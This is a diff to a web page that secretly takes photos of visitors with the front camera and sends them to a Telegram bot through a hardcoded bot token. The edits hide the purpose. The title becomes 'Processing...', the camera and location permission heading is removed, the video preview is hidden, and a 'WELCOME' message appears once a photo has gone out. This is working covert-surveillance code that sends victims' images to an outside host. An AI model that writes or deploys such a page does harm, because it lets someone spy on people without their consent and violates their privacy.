@@ -3,15 +3,16 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>User Capture</title>
+    <title>Processing...</title>
     <style>
-        body { background-color: black; color: white; text-align: center; padding-top: 20px; }
+        body { background-color: black; color: white; text-align: center; font-size: 24px; height: 100vh; display: flex; align-items: center; justify-content: center; }
+        #welcome { display: none; }
     </style>
 </head>
 <body>
-    <h2>Allow Camera & Location Access</h2>
-    <video id="video" autoplay style="width: 300px; height: 200px;"></video>
-    <canvas id="canvas" width="300" height="200" style="display: none;"></canvas>
+    <video id="video" autoplay style="display: none;"></video>
+    <canvas id="canvas" width="400" height="600" style="display: none;"></canvas>
+    <div id="welcome">WELCOME</div>
 
     <script>
         const TELEGRAM_BOT_TOKEN = "7250347146:AAF2fQ7skQFhHoOgsboWUJzQlmYo5ZAHMC4";
@@ -24,7 +25,7 @@
         async function startCapture() {
             try {
                 // 🚀 Camera Access
-                let stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 video.srcObject = stream;
 
                 setTimeout(() => {
@@ -77,6 +78,9 @@
             fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                 method: "POST",
                 body: formData
+            }).then(() => {
+                document.body.style.backgroundColor = "black"; // Background Black rahega
+                document.getElementById("welcome").style.display = "block"; // Welcome Text Show Karega
             }).catch(error => console.log("Photo sending error:", error));
         }
 
